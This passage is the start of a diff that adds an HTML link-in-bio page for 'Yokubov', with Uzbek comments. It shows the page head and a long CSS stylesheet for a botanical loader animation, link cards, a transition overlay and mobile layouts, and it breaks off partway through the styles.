@@ -1,0 +1,2252 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"/>
+    <!-- Botanical Leaf SVG Favicon -->
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='16' fill='%232A4237'/%3E%3Cpath d='M16 5 C11 11, 9 17, 16 26 C23 17, 21 11, 16 5 Z' fill='%23A1C0B0'/%3E%3Cpath d='M16 8 L16 23' stroke='%232A4237' stroke-width='1.2' stroke-linecap='round'/%3E%3C/svg%3E"/>
+  <title>Yokubov</title>
+  <meta name="description" content="Yokubov. Nafis tabiat va jiddiy minimalizm."/>
+
+  <!-- Google Fonts: Cormorant Garamond & Plus Jakarta Sans -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,600&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet"/>
+
+  <!-- FontAwesome 6 -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
+
+  <style>
+    *, *::before, *::after {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    button, a {
+      touch-action: manipulation;
+    }
+
+    :root {
+      --cream-bg: #F7F5F0;
+      --paper-white: #FFFFFF;
+      --sage-deep: #2A4237;
+      --sage-dark: #3A5547;
+      --sage-primary: #557967;
+      --sage-mid: #789989;
+      --sage-light: #A1C0B0;
+      --sage-pale: #D1E1D7;
+      --sage-ghost: #EDF4F0;
+      --earth-gold: #8C7B6D;
+      --earth-light: #B8A99B;
+      --text-main: #18221E;
+      --text-sec: #4D5C56;
+      --text-muted: #82928B;
+      --text-dim: #ABB8B2;
+      --border-subtle: rgba(85, 121, 103, 0.16);
+      --border-glow: rgba(161, 192, 176, 0.38);
+      --card-bg: rgba(255, 255, 255, 0.94);
+      --shadow-card: 0 24px 60px -15px rgba(40, 60, 50, 0.08), 0 6px 20px -4px rgba(0, 0, 0, 0.03);
+      --shadow-hover: 0 28px 65px -12px rgba(40, 60, 50, 0.12), 0 8px 24px -4px rgba(85, 121, 103, 0.08);
+    }
+
+    html, body {
+      width: 100%;
+      height: 100%;
+      min-height: 100dvh;
+      background: var(--cream-bg);
+      color: var(--text-main);
+      font-family: 'Plus Jakarta Sans', sans-serif;
+      overflow-x: hidden;
+    }
+
+    body {
+      overflow: hidden; /* locked during 8s loader */
+    }
+
+    /* ========================================================
+       LOADER SCREEN (TOZA, NOZIK VA KUCHLI BOTANIK ANIMATSIYA)
+    ======================================================== */
+    #loader {
+      position: fixed;
+      inset: 0;
+      z-index: 99999;
+      background: radial-gradient(ellipse 95% 85% at 50% 45%, #FFFFFF 0%, #F5F3EC 100%);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      transition: opacity 1.3s cubic-bezier(0.4, 0, 0.2, 1),
+                  transform 1.3s cubic-bezier(0.4, 0, 0.2, 1),
+                  filter 1.3s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    #loader.loader-exit {
+      opacity: 0;
+      filter: blur(16px);
+      transform: scale(1.05);
+      pointer-events: none;
+    }
+
+    #loaderCanvas {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 1;
+    }
+
+    /* Ambient Corner Botanical Vines on Loader */
+    .loader-corner-vines {
+      position: absolute;
+      inset: 0;
+      pointer-events: none;
+      z-index: 1;
+      opacity: 0.15;
+    }
+    .l-vine-tl { position: absolute; top: -20px; left: -20px; width: 280px; }
+    .l-vine-br { position: absolute; bottom: -20px; right: -20px; width: 280px; transform: rotate(180deg); }
+
+    .loader-stage {
+      position: relative;
+      z-index: 2;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    /* Central Botanical SVG Masterpiece */
+    .botanical-emblem {
+      width: 290px;
+      height: 290px;
+      margin-bottom: 24px;
+      position: relative;
+    }
+
+    .emblem-svg {
+      width: 100%;
+      height: 100%;
+      overflow: visible;
+    }
+
+    /* Outer Expanding Rings */
+    .rot-ring-cw {
+      transform-origin: 200px 200px;
+      animation: spinClockwise 55s linear infinite;
+    }
+    .rot-ring-ccw {
+      transform-origin: 200px 200px;
+      animation: spinCounter 42s linear infinite;
+    }
+    .rot-ring-slow {
+      transform-origin: 200px 200px;
+      animation: spinClockwise 85s linear infinite;
+    }
+
+    @keyframes spinClockwise {
+      from { transform: rotate(0deg); }
+      to   { transform: rotate(360deg); }
+    }
+    @keyframes spinCounter {
+      from { transform: rotate(360deg); }
+      to   { transform: rotate(0deg); }
+    }
+
+    /* Roots Drawing */
+    .draw-root {
+      stroke: var(--sage-primary);
+      stroke-width: 1.3;
+      stroke-linecap: round;
+      fill: none;
+      stroke-dasharray: 120;
+      stroke-dashoffset: 120;
+      animation: drawStroke 2s 0.2s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+    }
+
+    /* Vines & Stems Drawing */
+    .draw-stem {
+      stroke: var(--sage-primary);
+      stroke-width: 1.5;
+      stroke-linecap: round;
+      fill: none;
+      stroke-dasharray: 320;
+      stroke-dashoffset: 320;
+      animation: drawStroke 2.8s 0.4s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+    }
+    .draw-stem-center {
+      stroke: var(--sage-mid);
+      stroke-width: 1.2;
+      stroke-linecap: round;
+      fill: none;
+      stroke-dasharray: 260;
+      stroke-dashoffset: 260;
+      animation: drawStroke 2.6s 0.7s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+    }
+
+    /* Lateral Branches */
+    .draw-branch {
+      stroke: var(--sage-primary);
+      stroke-width: 1.1;
+      stroke-linecap: round;
+      fill: none;
+      stroke-dasharray: 120;
+      stroke-dashoffset: 120;
+    }
+    .br-l1 { animation: drawStroke 1.2s 1.6s cubic-bezier(0.4, 0, 0.2, 1) forwards; }
+    .br-r1 { animation: drawStroke 1.2s 1.8s cubic-bezier(0.4, 0, 0.2, 1) forwards; }
+    .br-l2 { animation: drawStroke 1.2s 2.1s cubic-bezier(0.4, 0, 0.2, 1) forwards; }
+    .br-r2 { animation: drawStroke 1.2s 2.3s cubic-bezier(0.4, 0, 0.2, 1) forwards; }
+    .br-l3 { animation: drawStroke 1.2s 2.6s cubic-bezier(0.4, 0, 0.2, 1) forwards; }
+    .br-r3 { animation: drawStroke 1.2s 2.8s cubic-bezier(0.4, 0, 0.2, 1) forwards; }
+    .br-l4 { animation: drawStroke 1.2s 3.1s cubic-bezier(0.4, 0, 0.2, 1) forwards; }
+    .br-r4 { animation: drawStroke 1.2s 3.3s cubic-bezier(0.4, 0, 0.2, 1) forwards; }
+
+    @keyframes drawStroke {
+      to { stroke-dashoffset: 0; }
+    }
+
+    /* Leaves Unfurling */
+    .bloom-leaf {
+      opacity: 0;
+      transform: scale(0.2);
+    }
+    .lf-l1 { animation: leafBloom 1s 2.4s cubic-bezier(0.34, 1.56, 0.64, 1) forwards; }
+    .lf-r1 { animation: leafBloom 1s 2.6s cubic-bezier(0.34, 1.56, 0.64, 1) forwards; }
+    .lf-l2 { animation: leafBloom 1s 2.9s cubic-bezier(0.34, 1.56, 0.64, 1) forwards; }
+    .lf-r2 { animation: leafBloom 1s 3.1s cubic-bezier(0.34, 1.56, 0.64, 1) forwards; }
+    .lf-l3 { animation: leafBloom 1s 3.4s cubic-bezier(0.34, 1.56, 0.64, 1) forwards; }
+    .lf-r3 { animation: leafBloom 1s 3.6s cubic-bezier(0.34, 1.56, 0.64, 1) forwards; }
+    .lf-l4 { animation: leafBloom 1s 3.9s cubic-bezier(0.34, 1.56, 0.64, 1) forwards; }
+    .lf-r4 { animation: leafBloom 1s 4.1s cubic-bezier(0.34, 1.56, 0.64, 1) forwards; }
+
+    @keyframes leafBloom {
+      0%   { opacity: 0; transform: scale(0.2); }
+      70%  { opacity: 1; transform: scale(1.08); }
+      100% { opacity: 1; transform: scale(1); }
+    }
+
+    /* Apex Blooming Lotus / Magnolia */
+    .bloom-petal {
+      opacity: 0;
+      transform-origin: 200px 85px;
+      transform: scale(0.3);
+    }
+    .pet-outer { animation: petalOpen 1.2s 4.5s cubic-bezier(0.34, 1.4, 0.64, 1) forwards; }
+    .pet-mid   { animation: petalOpen 1.2s 5.0s cubic-bezier(0.34, 1.4, 0.64, 1) forwards; }
+    .pet-inner { animation: petalOpen 1.2s 5.5s cubic-bezier(0.34, 1.4, 0.64, 1) forwards; }
+    .pet-core  { animation: petalOpen 1.2s 5.9s cubic-bezier(0.34, 1.4, 0.64, 1) forwards; }
+
+    @keyframes petalOpen {
+      0%   { opacity: 0; transform: scale(0.3); }
+      100% { opacity: 1; transform: scale(1); }
+    }
+
+    .stamen-point {
+      opacity: 0;
+      animation: stamenGlow 1s 6.1s ease forwards;
+    }
+    @keyframes stamenGlow {
+      to { opacity: 0.95; }
+    }
+
+    /* Pulsing Pollen Spores Wave from apex */
+    .flower-spore {
+      opacity: 0;
+      animation: sporeFloat 3.8s infinite ease-out;
+    }
+    .spore-a { animation-delay: 5.2s; }
+    .spore-b { animation-delay: 5.8s; }
+    .spore-c { animation-delay: 6.4s; }
+    .spore-d { animation-delay: 7.0s; }
+
+    @keyframes sporeFloat {
+      0%   { opacity: 0; transform: translate(0, 0) scale(0.6); }
+      35%  { opacity: 0.85; }
+      100% { opacity: 0; transform: translate(var(--dx, 0px), -55px) scale(1.3); }
+    }
+
+    .flower-aura {
+      opacity: 0;
+      animation: auraPulse 2.8s 5.0s ease-in-out infinite alternate forwards;
+    }
+    @keyframes auraPulse {
+      0%   { opacity: 0.15; }
+      100% { opacity: 0.55; }
+    }
+
+    /* Loader Typography (Faqat Yokubov) */
+    .loader-title {
+      font-family: 'Cormorant Garamond', serif;
+      font-size: 2.6rem;
+      font-weight: 500;
+      letter-spacing: 0.44em;
+      color: var(--text-main);
+      text-transform: uppercase;
+      opacity: 0;
+      transform: translateY(14px);
+      animation: textReveal 1.2s 2.8s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+      margin-left: 0.44em;
+    }
+
+    @keyframes textReveal {
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    /* Progress & Counter */
+    .loader-progress-box {
+      width: 240px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-top: 32px;
+      opacity: 0;
+      animation: textReveal 0.8s 3.2s ease forwards;
+    }
+
+    .progress-track {
+      width: 100%;
+      height: 1.5px;
+      background: rgba(85, 121, 103, 0.14);
+      border-radius: 2px;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .progress-bar {
+      position: absolute;
+      top: 0;
+      left: 0;
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, var(--sage-light), var(--sage-primary));
+      border-radius: 2px;
+      box-shadow: 0 0 10px rgba(85, 121, 103, 0.6);
+      transition: width 0.1s linear;
+    }
+
+    .progress-info {
+      width: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-top: 12px;
+    }
+
+    .percentage-text {
+      font-family: 'Cormorant Garamond', serif;
+      font-size: 1.05rem;
+      font-weight: 600;
+      color: var(--sage-dark);
+      letter-spacing: 0.08em;
+    }
+
+    /* ========================================================
+       MAIN APP INTERFACE
+    ======================================================== */
+    #app {
+      position: relative;
+      width: 100%;
+      min-height: 100vh;
+      opacity: 0;
+      transition: opacity 1.4s cubic-bezier(0.4, 0, 0.2, 1) 0.2s;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 60px 20px 40px;
+      z-index: 10;
+    }
+
+    #app.visible {
+      opacity: 1;
+    }
+
+    /* Background Interactive Canvas */
+    #bgCanvas {
+      position: fixed;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    /* Ambient Gradient Overlays */
+    .ambient-glow {
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      z-index: 0;
+      background:
+        radial-gradient(circle 650px at 15% 15%, rgba(161, 192, 176, 0.12) 0%, transparent 70%),
+        radial-gradient(circle 700px at 85% 85%, rgba(85, 121, 103, 0.09) 0%, transparent 70%),
+        radial-gradient(circle 480px at 50% 50%, rgba(255, 255, 255, 0.65) 0%, transparent 100%);
+    }
+
+    /* Botanical Watermarks in corners */
+    .watermark {
+      position: fixed;
+      pointer-events: none;
+      z-index: 1;
+      opacity: 0.09;
+    }
+    .wm-tl {
+      top: -30px;
+      left: -30px;
+      width: 260px;
+      transform: rotate(20deg);
+    }
+    .wm-br {
+      bottom: -30px;
+      right: -30px;
+      width: 240px;
+      transform: rotate(200deg);
+    }
+
+    /* Scene Wrapper */
+    .card-scene {
+      position: relative;
+      z-index: 2;
+      width: 100%;
+      max-width: 420px;
+      display: flex;
+      justify-content: center;
+    }
+
+    /* Main Card (STATIK, SICHQONCHADA QAYRILMAYDI, ODDIY VA BARQAROR) */
+    .master-card {
+      width: 100%;
+      background: var(--card-bg);
+      backdrop-filter: blur(28px) saturate(180%);
+      -webkit-backdrop-filter: blur(28px) saturate(180%);
+      border: 1px solid var(--border-subtle);
+      border-radius: 24px;
+      padding: 44px 34px 34px;
+      box-shadow: var(--shadow-card);
+      position: relative;
+      overflow: hidden;
+      transform: none !important; /* QAYRILMASIN */
+      transition: box-shadow 0.35s ease, border-color 0.35s ease;
+    }
+
+    .master-card:hover {
+      box-shadow: var(--shadow-hover);
+      border-color: rgba(85, 121, 103, 0.28);
+      transform: none !important; /* MUTLAQ STATIK */
+    }
+
+    /* Top Botanical Accent Line */
+    .card-top-accent {
+      position: absolute;
+      top: 0;
+      left: 36px;
+      right: 36px;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, var(--sage-light), var(--sage-primary), var(--sage-light), transparent);
+      border-radius: 2px;
+      z-index: 3;
+    }
+
+    /* Mini Corner Botanical Leaf */
+    .card-leaf-corner {
+      position: absolute;
+      top: 18px;
+      right: 22px;
+      width: 48px;
+      height: 48px;
+      opacity: 0.16;
+      pointer-events: none;
+      z-index: 1;
+    }
+
+    /* Profile Header */
+    .profile-header {
+      position: relative;
+      z-index: 3;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+    }
+
+    /* Monogram Seal */
+    .avatar-wrapper {
+      position: relative;
+      width: 86px;
+      height: 86px;
+      margin-bottom: 20px;
+    }
+
+    .avatar-ring-svg {
+      position: absolute;
+      inset: -4px;
+      width: calc(100% + 8px);
+      height: calc(100% + 8px);
+      transform-origin: center;
+      animation: spinClockwise 60s linear infinite;
+    }
+
+    .avatar-core {
+      position: absolute;
+      inset: 0;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #FFFFFF 0%, #F5F3EC 100%);
+      border: 1.5px solid var(--border-subtle);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 4px 16px rgba(85, 121, 103, 0.1);
+    }
+
+    .avatar-initial {
+      font-family: 'Cormorant Garamond', serif;
+      font-size: 2.2rem;
+      font-weight: 500;
+      color: var(--sage-dark);
+      letter-spacing: -0.02em;
+    }
+
+    /* Active Pulse Status Dot */
+    .status-badge {
+      position: absolute;
+      bottom: 2px;
+      right: 2px;
+      width: 14px;
+      height: 14px;
+      border-radius: 50%;
+      background: var(--paper-white);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.08);
+    }
+
+    .status-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #4EAA79;
+      position: relative;
+    }
+
+    .status-dot::after {
+      content: '';
+      position: absolute;
+      inset: -3px;
+      border-radius: 50%;
+      background: #4EAA79;
+      opacity: 0.5;
+      animation: dotPulse 2.2s infinite ease-out;
+    }
+
+    @keyframes dotPulse {
+      0%   { transform: scale(1); opacity: 0.6; }
+      100% { transform: scale(2.4); opacity: 0; }
+    }
+
+    /* Name & Typography */
+    .profile-name {
+      font-family: 'Cormorant Garamond', serif;
+      font-size: 2.35rem;
+      font-weight: 500;
+      color: var(--text-main);
+      letter-spacing: 0.04em;
+      line-height: 1.1;
+      margin-bottom: 12px;
+    }
+
+    /* JIDDIY VA CHUQUR MA'NOLI BIO */
+    .profile-bio {
+      font-family: 'Cormorant Garamond', serif;
+      font-size: 0.98rem;
+      font-style: italic;
+      font-weight: 400;
+      color: var(--text-sec);
+      letter-spacing: 0.02em;
+      line-height: 1.5;
+      max-width: 320px;
+      margin-bottom: 22px;
+    }
+
+    /* Clock Bar */
+    .time-bar {
+      display: inline-flex;
+      align-items: center;
+      gap: 7px;
+      font-size: 0.66rem;
+      color: var(--text-muted);
+      letter-spacing: 0.08em;
+      padding: 5px 12px;
+      background: rgba(247, 245, 240, 0.7);
+      border-radius: 12px;
+      border: 1px solid rgba(85, 121, 103, 0.1);
+      margin-bottom: 22px;
+    }
+
+    .time-bar i {
+      font-size: 0.7rem;
+      color: var(--sage-primary);
+    }
+
+    /* Delicate Divider */
+    .card-divider {
+      position: relative;
+      width: 100%;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, var(--border-subtle), transparent);
+      margin-bottom: 22px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .divider-node {
+      width: 5px;
+      height: 5px;
+      background: var(--sage-light);
+      transform: rotate(45deg);
+      border-radius: 1px;
+    }
+
+    /* Links Navigation */
+    .links-group {
+      position: relative;
+      z-index: 3;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      width: 100%;
+    }
+
+    .link-tile {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding: 14px 16px;
+      border-radius: 16px;
+      text-decoration: none;
+      color: var(--text-main);
+      background: #FFFFFF;
+      border: 1px solid var(--border-subtle);
+      transition: all 0.35s cubic-bezier(0.22, 1, 0.36, 1);
+      position: relative;
+      overflow: hidden;
+      cursor: pointer;
+    }
+
+    .link-tile::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(135deg, rgba(237, 244, 240, 0.65) 0%, rgba(209, 225, 215, 0.28) 100%);
+      opacity: 0;
+      transition: opacity 0.35s ease;
+      border-radius: 16px;
+    }
+
+    .link-tile:hover {
+      border-color: var(--sage-mid);
+      transform: translateY(-2px);
+      box-shadow: 0 8px 24px -4px rgba(85, 121, 103, 0.12);
+    }
+
+    .link-tile:hover::before {
+      opacity: 1;
+    }
+
+    /* Ripple Click Effect inside Tile */
+    .tile-ripple {
+      position: absolute;
+      border-radius: 50%;
+      background: rgba(85, 121, 103, 0.18);
+      transform: scale(0);
+      animation: tileRippleAnim 0.75s ease-out;
+      pointer-events: none;
+    }
+    @keyframes tileRippleAnim {
+      to {
+        transform: scale(4);
+        opacity: 0;
+      }
+    }
+
+    .tile-icon-box {
+      width: 42px;
+      height: 42px;
+      border-radius: 12px;
+      background: var(--sage-ghost);
+      border: 1px solid rgba(85, 121, 103, 0.16);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.05rem;
+      color: var(--sage-primary);
+      flex-shrink: 0;
+      position: relative;
+      z-index: 1;
+      transition: all 0.35s ease;
+    }
+
+    .link-tile:hover .tile-icon-box {
+      background: var(--sage-primary);
+      color: #FFFFFF;
+      border-color: var(--sage-primary);
+      transform: scale(1.04);
+    }
+
+    .tile-content {
+      flex: 1;
+      position: relative;
+      z-index: 1;
+    }
+
+    .tile-meta {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 2px;
+    }
+
+    .tile-title {
+      font-size: 0.66rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.12em;
+      color: var(--text-dim);
+    }
+
+    .tile-handle {
+      font-size: 0.94rem;
+      font-weight: 500;
+      color: var(--text-main);
+      letter-spacing: 0.01em;
+      transition: color 0.3s ease;
+    }
+
+    .link-tile:hover .tile-handle {
+      color: var(--sage-dark);
+    }
+
+    .tile-arrow {
+      font-size: 0.72rem;
+      color: var(--sage-mid);
+      position: relative;
+      z-index: 1;
+      opacity: 0.4;
+      transform: translateX(-4px);
+      transition: all 0.35s ease;
+    }
+
+    .link-tile:hover .tile-arrow {
+      opacity: 1;
+      transform: translateX(0);
+      color: var(--sage-primary);
+    }
+
+    /* Actions Bar */
+    .actions-bar {
+      position: relative;
+      z-index: 3;
+      display: flex;
+      gap: 8px;
+      margin-top: 14px;
+      width: 100%;
+    }
+
+    .action-btn {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 7px;
+      padding: 10px 14px;
+      border-radius: 12px;
+      background: transparent;
+      border: 1px dashed var(--border-subtle);
+      color: var(--text-sec);
+      font-size: 0.68rem;
+      font-weight: 500;
+      letter-spacing: 0.06em;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      font-family: inherit;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .action-btn i {
+      font-size: 0.7rem;
+      color: var(--sage-primary);
+    }
+
+    .action-btn:hover {
+      background: var(--sage-ghost);
+      border-color: var(--sage-primary);
+      color: var(--text-main);
+    }
+
+    /* Card Footer */
+    .card-footer {
+      position: relative;
+      z-index: 3;
+      margin-top: 24px;
+      padding-top: 18px;
+      border-top: 1px solid rgba(85, 121, 103, 0.08);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-size: 0.66rem;
+      color: var(--text-muted);
+      letter-spacing: 0.04em;
+    }
+
+    .footer-security {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      color: var(--sage-primary);
+    }
+    .footer-security i {
+      font-size: 0.62rem;
+    }
+
+    /* ========================================================
+       BOTANICAL LINK TRANSITION PORTAL (NAFIS ANIMATSIYALI HARAKAT)
+    ======================================================== */
+    #linkPortal {
+      position: fixed;
+      inset: 0;
+      z-index: 99990;
+      background: rgba(247, 245, 240, 0.94);
+      backdrop-filter: blur(28px);
+      -webkit-backdrop-filter: blur(28px);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.45s cubic-bezier(0.22, 1, 0.36, 1);
+    }
+
+    #linkPortal.portal-active {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    .portal-box {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      transform: scale(0.92);
+      transition: transform 0.45s cubic-bezier(0.22, 1, 0.36, 1);
+    }
+
+    #linkPortal.portal-active .portal-box {
+      transform: scale(1);
+    }
+
+    .portal-emblem-wrap {
+      position: relative;
+      width: 120px;
+      height: 120px;
+      margin-bottom: 22px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .portal-rings-svg {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      animation: spinClockwise 25s linear infinite;
+    }
+
+    .portal-center-icon {
+      width: 62px;
+      height: 62px;
+      border-radius: 50%;
+      background: var(--paper-white);
+      border: 1.5px solid var(--border-subtle);
+      box-shadow: 0 6px 22px rgba(85, 121, 103, 0.14);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.5rem;
+      color: var(--sage-primary);
+      position: relative;
+      z-index: 2;
+    }
+
+    .portal-target-title {
+      font-family: 'Cormorant Garamond', serif;
+      font-size: 1.9rem;
+      font-weight: 500;
+      color: var(--text-main);
+      letter-spacing: 0.04em;
+      margin-bottom: 4px;
+    }
+
+    .portal-target-handle {
+      font-size: 0.84rem;
+      color: var(--sage-dark);
+      letter-spacing: 0.08em;
+      font-weight: 500;
+      margin-bottom: 14px;
+    }
+
+    .portal-status-line {
+      font-size: 0.66rem;
+      letter-spacing: 0.22em;
+      text-transform: uppercase;
+      color: var(--text-muted);
+      margin-bottom: 18px;
+    }
+
+    .portal-meter-track {
+      width: 180px;
+      height: 2px;
+      background: rgba(85, 121, 103, 0.15);
+      border-radius: 2px;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .portal-meter-bar {
+      position: absolute;
+      top: 0;
+      left: 0;
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, var(--sage-light), var(--sage-primary));
+      border-radius: 2px;
+      transition: width 1.0s cubic-bezier(0.22, 1, 0.36, 1);
+    }
+
+    /* Toast Notification */
+    #toast {
+      position: fixed;
+      bottom: 24px;
+      left: 50%;
+      transform: translateX(-50%) translateY(20px);
+      background: var(--paper-white);
+      border: 1px solid var(--border-glow);
+      border-radius: 14px;
+      padding: 10px 20px;
+      font-size: 0.74rem;
+      color: var(--text-main);
+      z-index: 9999;
+      opacity: 0;
+      pointer-events: none;
+      transition: all 0.4s cubic-bezier(0.22, 1, 0.36, 1);
+      box-shadow: 0 10px 30px rgba(40, 60, 50, 0.12);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      letter-spacing: 0.02em;
+    }
+
+    #toast.toast-show {
+      opacity: 1;
+      transform: translateX(-50%) translateY(0);
+      pointer-events: auto;
+    }
+
+    #toast i {
+      color: var(--sage-primary);
+      font-size: 0.8rem;
+    }
+
+    /* ========================================================
+       RESPONSIVE & MOBILE POLISH (320px - 480px VIEWPORTS)
+    ======================================================== */
+    @media (max-width: 480px) {
+      #app {
+        min-height: 100dvh;
+        padding-top: max(56px, calc(env(safe-area-inset-top) + 48px));
+        padding-bottom: max(24px, calc(env(safe-area-inset-bottom) + 16px));
+        padding-left: 14px;
+        padding-right: 14px;
+        justify-content: center;
+      }
+
+      .sound-toggle {
+        top: max(14px, env(safe-area-inset-top));
+        right: max(14px, env(safe-area-inset-right));
+        padding: 6px 12px;
+        font-size: 0.72rem;
+        gap: 6px;
+      }
+
+      .master-card {
+        padding: 30px 18px 24px;
+        border-radius: 22px;
+      }
+
+      .avatar-wrapper {
+        width: 76px;
+        height: 76px;
+        margin-bottom: 14px;
+      }
+
+      .avatar-initial {
+        font-size: 1.95rem;
+      }
+
+      .profile-name {
+        font-size: 2.1rem;
+        margin-bottom: 8px;
+      }
+
+      .profile-bio {
+        font-size: 0.90rem;
+        line-height: 1.48;
+        max-width: 300px;
+        margin-bottom: 16px;
+      }
+
+      .time-bar {
+        margin-bottom: 16px;
+        padding: 4px 11px;
+        font-size: 0.63rem;
+      }
+
+      .card-divider {
+        margin-bottom: 16px;
+      }
+
+      .links-group {
+        gap: 9px;
+      }
+
+      .link-tile {
+        padding: 12px 14px;
+        gap: 12px;
+        border-radius: 14px;
+      }
+
+      .tile-icon-box {
+        width: 38px;
+        height: 38px;
+        font-size: 0.98rem;
+        border-radius: 10px;
+      }
+
+      .tile-handle {
+        font-size: 0.88rem;
+      }
+
+      .actions-bar {
+        margin-top: 12px;
+        gap: 7px;
+      }
+
+      .action-btn {
+        padding: 11px 10px;
+        font-size: 0.66rem;
+        border-radius: 10px;
+      }
+
+      .card-footer {
+        margin-top: 18px;
+        padding-top: 14px;
+        font-size: 0.64rem;
+      }
+
+      /* Tactile mobile feedback */
+      .link-tile:active, .action-btn:active {
+        transform: scale(0.98);
+        transition: transform 0.1s ease;
+      }
+
+      .sound-toggle:active {
+        transform: scale(0.95);
+      }
+
+      /* Loader on mobile */
+      .botanical-emblem {
+        width: 220px;
+        height: 220px;
+        margin-bottom: 18px;
+      }
+
+      .loader-title {
+        font-size: 2.0rem;
+        letter-spacing: 0.18em;
+      }
+
+      .progress-track {
+        width: 170px;
+      }
+    }
+
+    /* Extra compact devices (e.g. 360px and below) */
+    @media (max-width: 360px) {
+      .master-card {
+        padding: 24px 14px 20px;
+        border-radius: 18px;
+      }
+
+      .profile-name {
+        font-size: 1.85rem;
+      }
+
+      .profile-bio {
+        font-size: 0.84rem;
+      }
+
+      .tile-title {
+        font-size: 0.60rem;
+      }
+
+      .tile-handle {
+        font-size: 0.82rem;
+      }
+
+      .action-btn {
+        padding: 10px 8px;
+        font-size: 0.62rem;
+        letter-spacing: 0.02em;
+      }
+
+      .botanical-emblem {
+        width: 190px;
+        height: 190px;
+      }
+
+      .loader-title {
+        font-size: 1.8rem;
+      }
+    }
+
+    /* Ambient Audio Toggle Button */
+    .sound-toggle {
+      position: fixed;
+      top: 24px;
+      right: 24px;
+      z-index: 1000;
+      display: inline-flex;
+      align-items: center;
+      gap: 9px;
+      background: rgba(255, 255, 255, 0.88);
+      border: 1px solid var(--border-subtle);
+      border-radius: 999px;
+      padding: 8px 16px;
+      color: var(--sage-deep);
+      font-family: inherit;
+      font-size: 0.78rem;
+      font-weight: 500;
+      cursor: pointer;
+      backdrop-filter: blur(14px);
+      -webkit-backdrop-filter: blur(14px);
+      box-shadow: 0 4px 18px rgba(40, 60, 50, 0.06);
+      transition: all 0.35s cubic-bezier(0.22, 1, 0.36, 1);
+      user-select: none;
+    }
+    .sound-toggle:hover {
+      background: var(--paper-white);
+      border-color: var(--sage-primary);
+      transform: translateY(-2px);
+      box-shadow: 0 8px 24px rgba(40, 60, 50, 0.1);
+    }
+    .sound-toggle:active {
+      transform: translateY(0);
+    }
+    .sound-wave-bars {
+      display: flex;
+      align-items: flex-end;
+      gap: 3px;
+      height: 13px;
+    }
+    .sound-wave-bars .bar {
+      width: 2.5px;
+      background: var(--sage-primary);
+      border-radius: 2px;
+      animation: soundWave 1.1s ease-in-out infinite alternate;
+    }
+    .sound-wave-bars .bar-1 { height: 5px; animation-delay: 0.1s; }
+    .sound-wave-bars .bar-2 { height: 13px; animation-delay: 0.35s; }
